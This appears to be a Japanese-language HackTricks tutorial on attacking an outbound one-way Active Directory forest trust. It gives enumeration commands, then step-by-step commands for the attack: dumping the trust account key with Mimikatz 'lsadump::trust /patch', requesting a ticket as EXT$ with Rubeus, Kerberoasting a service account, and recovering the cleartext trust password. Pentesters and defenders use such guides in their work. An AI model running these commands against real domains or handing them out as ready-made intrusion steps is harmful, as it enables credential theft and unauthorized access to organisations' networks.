# 外部フォレストドメイン - 一方向（アウトバウンド）

{{#include ../../banners/hacktricks-training.md}}

このシナリオでは、**あなたのドメイン**が**異なるドメイン**のプリンシパルに**特権**を**信頼**しています。

## 列挙

### アウトバウンドトラスト
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Trust Account Attack

セキュリティの脆弱性は、ドメイン **A** とドメイン **B** の間に信頼関係が確立されるときに存在します。ここで、ドメイン **B** はドメイン **A** に対して信頼を拡張します。この設定では、ドメイン **B** のためにドメイン **A** に特別なアカウントが作成され、これは2つのドメイン間の認証プロセスにおいて重要な役割を果たします。このアカウントはドメイン **B** に関連付けられており、ドメイン間でサービスにアクセスするためのチケットを暗号化するために使用されます。

ここで理解すべき重要な点は、この特別なアカウントのパスワードとハッシュが、コマンドラインツールを使用してドメイン **A** のドメインコントローラーから抽出できるということです。このアクションを実行するためのコマンドは次のとおりです:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
この抽出は、名前の後に**$**が付いたアカウントがアクティブであり、ドメイン**A**の「Domain Users」グループに属しているため、これに関連する権限を継承しているため可能です。これにより、個人はこのアカウントの資格情報を使用してドメイン**A**に対して認証を行うことができます。

**警告:** この状況を利用して、ユーザーとしてドメイン**A**に足場を築くことが可能ですが、権限は限られています。しかし、このアクセスはドメイン**A**での列挙を行うには十分です。

`ext.local`が信頼するドメインで、`root.local`が信頼されたドメインであるシナリオでは、`root.local`内に`EXT$`という名前のユーザーアカウントが作成されます。特定のツールを使用することで、Kerberos信頼キーをダンプし、`root.local`内の`EXT$`の資格情報を明らかにすることが可能です。これを達成するためのコマンドは次のとおりです:
```bash
lsadump::trust /patch
```
これに続いて、別のツールコマンドを使用して `root.local` 内で `root.local\EXT$` として認証するために抽出された RC4 キーを使用することができます:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
この認証ステップは、`root.local` 内のサービスを列挙し、さらには悪用する可能性を開きます。たとえば、次のコマンドを使用してサービスアカウントの資格情報を抽出する Kerberoast 攻撃を実行することができます。
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### 明文の信頼パスワードの収集

前のフローでは、**明文パスワード**の代わりに信頼ハッシュが使用されました（これは**mimikatzによってダンプされました**）。

明文パスワードは、mimikatzの\[ CLEAR ]出力を16進数から変換し、ヌルバイト‘\x00’を削除することで取得できます：

![](<../../images/image (938).png>)

信頼関係を作成する際に、ユーザーが信頼のためにパスワードを入力する必要がある場合があります。このデモでは、キーは元の信頼パスワードであり、したがって人間が読み取れるものです。キーがサイクルする（30日）と、明文は人間が読み取れなくなりますが、技術的には依然として使用可能です。

明文パスワードは、信頼アカウントとして通常の認証を行うために使用でき、信頼アカウントのKerberos秘密鍵を使用してTGTを要求する代替手段となります。ここでは、ext.localからroot.localに対してDomain Adminsのメンバーをクエリしています：

![](<../../images/image (792).png>)

## 参考文献

- [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

{{#include ../../banners/hacktricks-training.md}}
